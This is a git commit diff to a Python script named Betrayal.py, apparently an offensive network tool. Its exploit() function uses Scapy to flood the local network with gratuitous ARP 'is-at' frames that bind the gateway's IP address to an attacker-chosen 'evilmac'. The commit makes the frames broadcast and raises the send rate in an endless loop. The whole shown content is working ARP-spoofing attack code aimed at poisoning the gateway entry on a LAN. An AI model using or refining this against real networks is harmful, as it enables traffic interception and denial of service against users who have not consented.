e14c0c104c1d0126ae9470d9a8d17eb421c3aceb
Magama Bazarov <88490676+in9uz@users.noreply.github.com>
2022-09-08 21:04:03 +0500

    Add files via upload

--- Betrayal.py
+++ Betrayal.py
@@ -36,14 +36,12 @@ def take_args():
 args = take_args()
 
 
-
-
 def exploit(gateway, interface, evilmac):
-    ether_frame = Ether(src=args.evilmac, dst=l2broad, type=0x0806)
-    arp_frame = ARP(op="is-at", pdst=args.gateway, hwsrc=args.evilmac, hwdst=args.evilmac, psrc=args.gateway)
+    ether_frame = Ether(src=args.evilmac, dst=l2broad)
+    arp_frame = ARP(op="is-at", pdst=args.gateway, hwsrc=args.evilmac, hwdst=l2broad, psrc=args.gateway)
     grat_frame = ether_frame / arp_frame
     grat_frame.show()
-    sendp(grat_frame, iface=args.interface, inter=1, loop=1, verbose=1)
+    sendp(grat_frame, iface=args.interface, inter=0.3, loop=1, verbose=1)
 
 
     
